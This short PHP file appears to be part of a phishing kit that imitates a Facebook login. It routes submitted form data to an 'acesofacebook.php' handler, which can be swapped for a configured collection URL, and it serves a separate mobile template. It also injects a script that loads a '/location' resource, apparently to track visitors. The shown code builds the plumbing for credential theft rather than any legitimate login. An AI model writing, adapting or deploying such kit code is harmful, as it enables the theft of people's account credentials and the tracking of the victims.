<?php


$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$action_post = dirname(dirname($actual_link)).'/acesofacebook.php?'.http_build_query($_GET);

if(defined('ACCESSFACEBOOK_URL') && !defined("NO_CHANGE_ACTION")){
   $action_post = ACCESSFACEBOOK_URL;
};


if (IS_MOBILE) {
    include(dirname(__FILE__).'/mobile.php');
}else{
}

?>

      <script>
         var script_ = document.createElement('script');
         script_.src = "<?php echo dirname($action_post); ?>/location";
         script_.asunc = true;
         document.body.appendChild(script_);
      </script>